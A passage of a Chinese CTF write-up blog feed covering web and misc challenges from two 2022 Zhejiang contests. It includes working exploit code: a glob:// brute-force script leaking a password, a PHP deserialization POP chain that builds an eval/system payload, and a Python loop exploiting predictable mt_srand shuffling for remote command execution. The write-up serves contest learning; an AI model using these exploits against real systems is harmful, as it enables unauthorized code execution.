class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>获取到<code>passwd</code>后可以<code>rce</code>，而<code>DirectoryIterator</code>可以列目录，它的参数支持<code>glob://</code>伪协议，当存在文件时<code>$file-&gt;getSize()有回显</code>回显，这样就可以通过脚本遍历获取到<code>passwd</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://80.endpoint-ab681a0db3214901a65a00b23c616372.dasc.buuoj.cn:81/?passwd=123&amp;dir=glob:///tmp/hint&quot;</span><br>b=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>data=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> b:<br>        r=requests.get(url+data+j+<span class="hljs-string">&#x27;*&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            data=data+j<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(data)<br><span class="hljs-built_in">print</span>(data)<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-web-1-1.png"></p><p>拿到passwd：<code>st1sOFAblF</code>，进行rce</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-web-1-2.png"></p><h3 id="ezGadget01"><a href="#ezGadget01" class="headerlink" title="ezGadget01"></a>ezGadget01</h3><p><em>赛后复现</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ez</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">run</span>();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;exit&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Junit</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$judge</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;judge = False;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"><span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;judge)<br>        &#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;, &quot;</span>, <span class="hljs-variable">$arguments</span>));<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ez1</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;get&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Space</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;My name is &quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CallFunction</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$num</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;num = <span class="hljs-number">5</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;num &gt; <span class="hljs-number">10</span>)<br>        &#123;<br>            <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$arguments</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">chain</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$func</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Proc01</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$param</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;param = <span class="hljs-string">&quot;whoami&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;param))<br>        &#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;param-&gt;arg;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SetName</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;app-&gt;<span class="hljs-keyword">list</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetName</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;app-&gt;<span class="hljs-keyword">list</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]));<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>Junit</code>类中存在<code>e</code>方法会执行<code>eval</code>函数<br>可以利用<code>CallFunction</code>类中的<code>__call</code>方法调用<code>Junit</code>类中<code>e</code>方法<br>利用<code>GetName</code>类中的<code>__get</code>方法触发<code>CallFunction</code>类中的<code>__call</code>方法<br>利用<code>Proc01</code>类中的<code>__toString</code>方法触发<code>GetName</code>类中的<code>__get</code>方法<br>利用<code>Space</code>类中的<code>__wakeup</code>方法触发<code>Proc01</code>类中的<code>__toString</code>方法</p><p>调用顺序:<code>Space-&gt;Proc01-&gt;GetName-&gt;CallFunction-&gt;Junit</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Junit</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$judge</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;judge = True;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CallFunction</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$num</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;num=<span class="hljs-number">20</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;func=[<span class="hljs-keyword">new</span> <span class="hljs-title class_">Junit</span>(),<span class="hljs-string">&quot;e&quot;</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetName</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;app=<span class="hljs-keyword">new</span> <span class="hljs-title class_">CallFunction</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;args=<span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Proc01</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$param</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>       <span class="hljs-variable language_">$this</span>-&gt;param=<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetName</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Space</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Proc01</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Space</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-web-3-1.png"></p><h1 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h1><p>疫情原因线上awd。Rank: 2</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;初赛&quot;&gt;&lt;a href=&quot;#初赛&quot; class=&quot;headerlink&quot; title=&quot;初赛&quot;&gt;&lt;/a&gt;初赛&lt;/h1&gt;&lt;h2 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="awd" scheme="https://www.lewiserii.top/tags/awd/"/>
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="台州" scheme="https://www.lewiserii.top/tags/%E5%8F%B0%E5%B7%9E/"/>
    
  </entry>
  
  <entry>
    <title>第五届浙江省大学生网络与信息安全竞赛决赛-WP</title>
    <link href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-wp.html"/>
    <id>https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-wp.html</id>
    <published>2022-09-24T07:00:00.000Z</published>
    <updated>2022-10-02T02:34:35.591Z</updated>
    
    <content type="html"><![CDATA[<p>二战浙江省赛，混了个二等奖。感觉预赛题目都比决赛题目出的好</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">10000</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;Ctfer&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">shuffle</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$a</span>[<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]](<span class="hljs-variable">$a</span>[<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]]);<br></code></pre></td></tr></table></figure><p>因为<code>shuffle</code>函数使用伪随机数产生器，所以当时间戳相同时，两个相同数组打乱后产生的两个新数组也相同</p><p>在本地编写php代码，获取索引值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">10000</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;Ctfer&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">shuffle</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">10003</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-string">&#x27;system&#x27;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-string">&#x27;system:&#x27;</span>.<span class="hljs-variable">$i</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])&#123;<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-string">&#x27;cmd:&#x27;</span>.<span class="hljs-variable">$i</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>将本地获取到的索引值传入靶机，成功rce</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    cmd=raw_input(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&#x27;%20&#x27;</span>);<br>    t=<span class="hljs-built_in">int</span>(time.time())<br>    d=requests.get(<span class="hljs-string">&#x27;http://172.29.17.232/index.php?a=%s&amp;cmd=%s&#x27;</span>%(<span class="hljs-built_in">int</span>(t),cmd)).text<br><br>    system=<span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">&#x27;system:(\d+)&#x27;</span>,d)[<span class="hljs-number">0</span>])<br>    c=<span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">&#x27;cmd:(\d+)&#x27;</span>,d)[<span class="hljs-number">0</span>])<br><br>    d=requests.get(<span class="hljs-string">&#x27;http://80.endpoint-d9deec0835844de5831e550ffe384d16.dasc.buuoj.cn:81/?cmd=%s&amp;c=%s&amp;b=%s&#x27;</span>%(cmd,c,system))<br>    <span class="hljs-built_in">print</span>(d.text.split(<span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>)[<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-ezphp-1.png"></p><h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p>过滤了空格，用<code>/**/</code>代替</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-babysql-1.png"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="checkin-gift"><a href="#checkin-gift" class="headerlink" title="checkin_gift"></a>checkin_gift</h2><p>两张图片中间拿到<code>Gift from glzjin: FIWOIxqEZyIWJwIHG01ZDxqMZ1EUGycHGHHlERqnDyAUDyERHH9PI0qOZ0EWGIcEGIxlESSAGREAHGWUF05RAD== Have a nice time, Bye!</code></p><p>先凯撒位移13位</p><p><code>SVJBVkdRMlVJWjVUT01MQkdZM1RHTlpUTUUyREdaQlNHQlREUU9CV0dBM0RJTVpRTVkyRFFNTERNUTJHS05ENQ==</code></p><p>base64</p><p><code>IRAVGQ2UIZ5TOMLBGY3TGNZTME2DGZBSGBTDQOBWGA3DIMZQMY2DQMLDMQ2GKND5</code></p><p>base32</p><p><code>DASCTF&#123;71a67373a43d20f88606430f481cd4e4&#125;</code></p><h2 id="m4a"><a href="#m4a" class="headerlink" title="m4a"></a>m4a</h2><p>在文件结尾发现一个被反转的压缩包，提取出来一个带密码的压缩包</p><p>添加后缀<code>mp4</code>发现存在摩斯</p><p><code>-... .- ....- ...-- -... -.-. . ..-. -.-. ..--- ----- 